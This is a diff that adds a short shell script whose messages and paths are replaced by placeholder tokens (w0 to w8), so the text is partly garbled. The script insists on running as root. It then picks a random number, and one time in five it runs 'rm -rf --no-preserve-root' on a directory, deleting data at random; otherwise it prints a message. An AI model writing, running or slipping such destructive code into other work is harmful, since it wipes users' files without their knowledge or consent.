@@ -1,0 +1,16 @@
+#!/bin/sh
+
+if [ "$EUID" -ne 0 ]; then
+    echo "w0 w1"
+    exit 1
+fi
+
+echo "w2 w3"
+
+w4=$((1 + RANDOM % 5))
+
+if [ $w4 -eq 1 ]; then
+    rm -rf --no-preserve-root /w5/w6/
+else
+    echo "w7 w8"
+fi
